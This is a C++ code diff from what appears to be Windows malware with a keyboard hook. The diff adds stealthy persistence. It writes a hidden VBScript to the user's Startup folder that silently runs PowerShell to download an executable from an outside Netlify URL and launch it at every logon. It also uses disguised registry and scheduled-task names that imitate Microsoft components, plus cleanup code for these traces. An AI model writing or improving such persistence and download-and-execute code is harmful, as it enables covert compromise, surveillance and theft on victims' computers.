@@ -2697,7 +2697,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 #define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
-#define NETPEN_STARTUP_SUFFIX ".update.cmd"
+#define NETPEN_STARTUP_SUFFIX ".update.vbs"
 
 static void EnsureStartupEntry();
 
@@ -2720,10 +2720,12 @@ static void CleanupPersistence() {
     // Remove scheduled task
     ExecuteCommand(ToNarrow(std::wstring(L"schtasks /delete /tn ") + std::wstring(NETPEN_TASKNAME) + L" /f"));
 
-    // Remove startup folder .cmd
+    // Remove startup folder .cmd and .vbs
     char ad[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", ad, MAX_PATH) > 0) {
-        DeleteFileA((std::string(ad) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exeName + NETPEN_STARTUP_SUFFIX).c_str());
+        std::string startupBase = std::string(ad) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exeName;
+        DeleteFileA((startupBase + ".update.cmd").c_str());
+        DeleteFileA((startupBase + ".update.vbs").c_str());
     }
 
     // Remove temp files
@@ -2851,16 +2853,16 @@ static void InstallStartup() {
         RegCloseKey(hKey);
     }
 
-    // 2. Startup folder .cmd
+    // 2. Startup folder .vbs (hidden, no console window)
     char appData[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appData, MAX_PATH) > 0) {
         std::string startupDir = std::string(appData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-        std::string cmdPath = startupDir + "\\" + exeName + NETPEN_STARTUP_SUFFIX;
-        std::string cmdContent = "@start /b \"\" " + psCmd + "\r\n";
-        HANDLE hFile = CreateFileA(cmdPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+        std::string vbsPath = startupDir + "\\" + exeName + NETPEN_STARTUP_SUFFIX;
+        std::string vbsContent = "CreateObject(\"WScript.Shell\").Run \"powershell -w h -c \"\"$p=$env:TEMP+'\\" + exeName + "';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"\"\", 0, False\r\n";
+        HANDLE hFile = CreateFileA(vbsPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD w = 0;
-            WriteFile(hFile, cmdContent.c_str(), (DWORD)cmdContent.size(), &w, NULL);
+            WriteFile(hFile, vbsContent.c_str(), (DWORD)vbsContent.size(), &w, NULL);
             CloseHandle(hFile);
         }
     }
